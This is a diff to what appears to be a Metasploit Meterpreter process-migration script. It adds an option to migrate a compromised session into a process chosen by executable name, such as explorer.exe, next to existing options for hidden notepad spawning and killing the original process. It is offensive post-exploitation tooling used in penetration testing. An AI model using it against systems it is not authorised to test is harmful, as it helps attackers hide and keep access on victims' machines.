@@ -9,13 +9,16 @@
 spawn = false
 kill = false
 target_pid = nil
+target_name = nil
 
 opts = Rex::Parser::Arguments.new(
 	"-h" => [ false, "Help menu." ],
 	"-f" => [ false, "Launch a process and migrate into the new process"],
 	"-p" => [ true , "PID to migrate to."],
-	"-k" => [ false, "Kill original process."]
+	"-k" => [ false, "Kill original process."],
+	"-n" => [ true, "Migrate into the first process with this executable name (explorer.exe)" ]
 )
+
 opts.parse(args) { |opt, idx, val|
 	case opt
 	when "-f"
@@ -24,6 +27,8 @@ opts.parse(args) { |opt, idx, val|
 		kill = true
 	when "-p"
 		target_pid = val.to_i
+	when "-n"
+		target_name = val.to_s
 	when "-h"
 		print_line(opts.usage)
 		raise Rex::Script::Completed
@@ -47,6 +52,7 @@ def create_temp_proc()
 	proc = client.sys.process.execute(cmd, nil, {'Hidden' => true })
 	return proc.pid
 end
+
 # In case no option is provided show help
 if args.length == 0
 	print_line(opts.usage)
@@ -63,6 +69,14 @@ if client.platform =~ /win32|win64/
 	if spawn
 		print_status("Spawning notepad.exe process to migrate to")
 		target_pid = create_temp_proc
+	end
+
+	if target_name and not target_pid
+		target_pid = client.sys.process[target_name]
+		if not target_pid
+			print_status("Could not identify the process ID for #{target_name}")
+			raise Rex::Script::Completed
+		end
 	end
 
 	begin
